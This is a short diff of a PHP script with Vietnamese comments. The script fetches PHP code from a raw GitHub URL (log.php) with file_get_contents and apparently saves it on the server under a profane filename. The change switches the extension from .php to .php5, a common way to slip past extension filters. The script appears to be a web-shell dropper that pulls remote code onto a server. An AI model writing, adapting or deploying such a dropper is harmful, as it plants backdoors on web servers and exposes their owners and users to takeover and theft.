@@ -3,7 +3,7 @@
 $url = "https://raw.githubusercontent.com/DitMeCongSan1/ak/refs/heads/main/log.php";
 
 // Tên file sẽ được tạo
-$filename = "ditmemay.php";
+$filename = "ditmemay.php5";
 
 // Lấy nội dung từ URL
 $content = file_get_contents($url);
